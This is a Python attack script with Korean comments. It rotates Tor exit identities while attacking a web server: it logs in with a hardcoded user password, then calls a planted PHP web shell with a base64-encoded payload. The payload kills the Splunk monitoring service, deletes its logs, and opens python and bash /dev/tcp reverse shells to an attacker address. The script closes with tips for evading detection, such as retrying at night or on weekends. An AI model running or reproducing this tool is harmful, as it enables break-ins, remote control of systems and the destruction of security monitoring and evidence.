#!/usr/bin/env python3
"""
Tor Identity 로테이션 공격
매번 새로운 IP로 요청
"""

import requests
import sys
import urllib.parse
import base64
import time
import subprocess

def change_tor_identity():
    """Tor Identity 변경"""
    print("[*] Tor Identity 변경 중...")

    # 방법 1: Tor 컨트롤 포트 사용
    try:
        import stem
        from stem import Signal
        from stem.control import Controller

        with Controller.from_port(port=9051) as controller:
            controller.authenticate()
            controller.signal(Signal.NEWNYM)
            print("[+] Tor Identity 변경 완료 (컨트롤 포트)")
            time.sleep(3)  # 새 회로 생성 대기
            return True
    except:
        pass

    # 방법 2: Tor 재시작
    try:
        subprocess.run(["killall", "-HUP", "tor"], check=False)
        print("[+] Tor 재시작 신호 전송")
        time.sleep(5)
        return True
    except:
        pass

    # 방법 3: 수동 대기
    print("[!] Tor Identity 자동 변경 실패")
    print("[*] 10초 대기 (Tor 자동 로테이션)...")
    time.sleep(10)
    return True

def check_tor_ip():
    """현재 Tor IP 확인"""
    try:
        session = requests.Session()
        session.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }

        resp = session.get('https://check.torproject.org/api/ip', timeout=10)
        data = resp.json()

        if data.get('IsTor'):
            ip = data.get('IP', 'Unknown')
            print(f"[+] 현재 Tor IP: {ip}")
            return ip
    except:
        pass

    return None

def tor_attack(target_ip, attacker_ip, attacker_port, attempts=5):
    """Tor Identity 로테이션 공격"""

    base_url = f"http://{target_ip}"

    print("="*60)
    print("Tor Identity 로테이션 공격")
    print("="*60)
    print(f"타겟: {target_ip}")
    print(f"C2: {attacker_ip}:{attacker_port}")
    print(f"시도 횟수: {attempts}\n")

    # 올인원 페이로드
    all_in_one = " && ".join([
        "pkill -9 splunkd 2>/dev/null",
        "pkill -9 splunk 2>/dev/null",
        "/opt/splunk/bin/splunk stop 2>/dev/null",
        "systemctl stop Splunkd 2>/dev/null",
        "rm -rf /opt/splunk/var/log/splunk/* 2>/dev/null",
        f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{attacker_ip}\",{attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])' &",
        f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1 &",
    ])

    b64 = base64.b64encode(all_in_one.encode()).decode()
    final_cmd = f"echo {b64}|base64 -d|bash &"

    selected_shell = "shell_4727.php"

    print(f"[!] C2 리스너 준비:")
    print(f"    nc -lvnp {attacker_port}\n")
    print("="*60)

    for i in range(1, attempts + 1):
        print(f"\n[시도 {i}/{attempts}]")
        print("="*60)

        # Tor Identity 변경
        if i > 1:  # 첫 시도는 변경 안함
            change_tor_identity()

        # 현재 IP 확인
        current_ip = check_tor_ip()

        # 새 세션 생성
        session = requests.Session()
        session.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }

        # alice 로그인
        print(f"[{i}] alice 로그인...")
        data = {'username': 'alice', 'password': 'alice2024'}

        try:
            resp = session.post(f"{base_url}/login.php", data=data, allow_redirects=True, timeout=10)
            print(f"[+] 로그인 완료")
        except Exception as e:
            print(f"[-] 로그인 실패: {str(e)[:50]}")
            continue

        # 공격 실행
        final_url = f"{base_url}/file.php?name=uploads/{selected_shell}&cmd={urllib.parse.quote(final_cmd)}"

        print(f"[{i}] 공격 실행...")

        try:
            start = time.time()
            resp = session.get(final_url, timeout=20)
            elapsed = time.time() - start

            print(f"[+] 응답:")
            print(f"    Status: {resp.status_code}")
            print(f"    시간: {elapsed:.2f}초")

            if resp.status_code == 200:
                print(f"\n[+] ✅✅✅ 200 OK - 성공!")
                print(f"[*] Splunk 무력화 성공 가능성!")
                print(f"[!] C2 리스너 확인!\n")

                confirm = input("[?] C2 연결 확인됐나요? (y/n): ").strip().lower()
                if confirm == 'y':
                    print("\n[+] ✅✅✅ 공격 성공!")
                    return True

            elif resp.status_code == 403:
                print(f"[-] 403 Forbidden")
                print(f"[*] Splunk 여전히 탐지 중")

        except requests.exceptions.Timeout:
            print(f"[+] ✅ 타임아웃 - 백그라운드 실행 가능성!")
            print(f"[!] C2 연결 확인!\n")

            confirm = input("[?] C2 연결 확인됐나요? (y/n): ").strip().lower()
            if confirm == 'y':
                print("\n[+] ✅✅✅ 공격 성공!")
                return True

        except Exception as e:
            print(f"[-] 오류: {str(e)[:100]}")

        # 다음 시도 전 대기
        if i < attempts:
            wait_time = 30
            print(f"\n[*] 다음 시도까지 {wait_time}초 대기...")
            print(f"[*] Splunk 탐지 윈도우 리셋 대기 중...\n")
            time.sleep(wait_time)

    print("\n" + "="*60)
    print(f"[-] {attempts}번 시도 모두 실패")
    print("="*60)
    print("\n[!] 권장사항:")
    print("  1. 더 긴 대기 시간 (60초+)")
    print("  2. 새벽/주말에 재시도")
    print("  3. Splunk 설정 확인")

    return False

def main():
    if len(sys.argv) < 4:
        print("사용법: python3 112_tor_rotation_attack.py <TARGET> <ATTACKER_IP> <PORT> [ATTEMPTS]")
        print("예시: python3 112_tor_rotation_attack.py 43.201.154.142 57.181.28.7 4444 5")
        sys.exit(1)

    target_ip = sys.argv[1]
    attacker_ip = sys.argv[2]
    attacker_port = sys.argv[3]
    attempts = int(sys.argv[4]) if len(sys.argv) > 4 else 5

    # stem 라이브러리 확인
    try:
        import stem
        print("[+] stem 라이브러리 사용 가능 (Tor 컨트롤)")
    except:
        print("[!] stem 라이브러리 없음")
        print("[*] 설치: pip3 install stem")
        print("[*] 수동 Identity 변경 사용\n")

    tor_attack(target_ip, attacker_ip, attacker_port, attempts)

if __name__ == "__main__":
    main()
